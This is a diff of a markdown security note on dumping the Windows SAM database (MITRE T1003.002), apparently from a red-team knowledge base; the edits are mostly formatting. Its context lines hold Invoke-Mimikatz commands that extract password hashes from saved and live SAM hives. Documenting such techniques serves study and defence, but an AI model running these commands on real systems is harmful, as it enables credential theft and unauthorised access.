@@ -1,14 +1,16 @@
 ---
 date: 
 tags:
+  - ActiveDirectory
+  - SAM
 ---
 
 ```table-of-contents
 ```
 
----
-description: https://attack.mitre.org/techniques/T1003/002/
----
+# description: 
+
+https://attack.mitre.org/techniques/T1003/002/
 
 # Security Account Manager (SAM)
 
@@ -83,7 +85,7 @@ Github: [https://github.com/BC-SECURITY/Empire/blob/main/empire/test/data/module
 </strong><strong># Dump from SAM and SYSTEM. Enusre files are in current working directory
 </strong>Invoke-Mimikatz -command "lsadump::sam /system:SYSTEM /sam:SAM"
 
-# Dump against the live hive files
+# Dump against the Live Hive Files
 
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 </code></pre>
